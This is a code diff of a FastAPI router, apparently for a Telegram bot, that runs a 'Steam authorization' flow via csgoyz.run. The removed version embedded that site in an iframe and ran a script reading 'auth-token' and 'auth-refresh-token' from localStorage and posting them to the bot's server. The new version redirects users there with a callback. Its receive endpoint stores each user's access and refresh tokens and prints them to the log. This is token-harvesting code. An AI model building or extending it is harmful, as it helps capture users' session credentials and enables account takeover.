@@ -1,5 +1,5 @@
 from fastapi import APIRouter, Request
-from fastapi.responses import HTMLResponse, JSONResponse
+from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
 
 router = APIRouter()
 
@@ -7,14 +7,15 @@ SELF = "https://tg-bot-test-gkbp.onrender.com"
 
 RAM_DATA = {}
 
-# 1️⃣ старт авторизации с автоматическим скриптом
+# 1️⃣ старт авторизации — промежуточная страница на нашем домене
 @router.get("/auth/start")
 async def auth_start(chat_id: int):
     """
-    Пользователь открывает ссылку, открывается страница на нашем домене,
-    а она загружает csgoyz.run в iframe и автоматически ловит токены.
+    Пользователь открывает ссылку -> открывается промежуточная страница
+    -> автоматически редирект на csgoyz.run с callback на наш домен.
     """
     tg_callback = f"{SELF}/auth/receive?chat_id={chat_id}"
+    csgoyz_url = f"https://csgoyz.run/?tg_callback={tg_callback}"
 
     return HTMLResponse(f"""
 <!DOCTYPE html>
@@ -22,51 +23,36 @@ async def auth_start(chat_id: int):
 <head>
 <title>Авторизация Steam</title>
 <style>
-body {{ margin:0; font-family: Arial; background:#0f1117; color:white; }}
-#frame {{ width:100%; height:90vh; border:none; }}
-#top {{ padding:12px; background:#151821; border-bottom:1px solid #222; }}
+body {{ font-family: Arial; background:#0f1117; color:white; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }}
+.container {{ text-align:center; }}
 </style>
 </head>
 <body>
-<div id="top">🔐 Авторизация через Steam</div>
-<iframe id="frame" src="https://csgoyz.run/?tg_callback={tg_callback}"></iframe>
+<div class="container">
+<h2>🔐 Пожалуйста, дождитесь окончания авторизации...</h2>
+<p>Через секунду вы будете перенаправлены на страницу входа через Steam.</p>
+</div>
 
 <script>
-(async function() {{
-    const callback = "{tg_callback}";
-    let token, refresh;
-
-    for(let i=0;i<40;i++){{
-        token = localStorage.getItem("auth-token");
-        refresh = localStorage.getItem("auth-refresh-token");
-        if(token && refresh) break;
-        await new Promise(r=>setTimeout(r,500));
-    }}
-
-    if(token && refresh){{
-        await fetch(callback, {{
-            method:"POST",
-            headers:{{"Content-Type":"application/json"}},
-            body: JSON.stringify({{token, refresh}})
-        }});
-        alert("✅ Токены автоматически отправлены на сервер.");
-    }} else {{
-        alert("❌ Не удалось получить токены. Попробуйте ещё раз.");
-    }}
-}})();
+setTimeout(() => {{
+    window.location.href = "{csgoyz_url}";
+}}, 1000);  // редирект через 1 секунду
 </script>
 </body>
 </html>
 """)
 
-# 2️⃣ приём токенов
+# 2️⃣ приём токенов после возвращения с csgoyz.run
 @router.post("/auth/receive")
 async def auth_receive(request: Request, chat_id: int):
+    """
+    Сюда csgoyz.run отправляет токены через fetch.
+    """
     data = await request.json()
 
     RAM_DATA.setdefault(chat_id, {})
-    RAM_DATA[chat_id]["access"] = data["token"]
-    RAM_DATA[chat_id]["refresh"] = data["refresh"]
+    RAM_DATA[chat_id]["access"] = data.get("token")
+    RAM_DATA[chat_id]["refresh"] = data.get("refresh")
 
     print("🔥 TOKENS:", chat_id, RAM_DATA[chat_id])
     return JSONResponse({"ok": True})
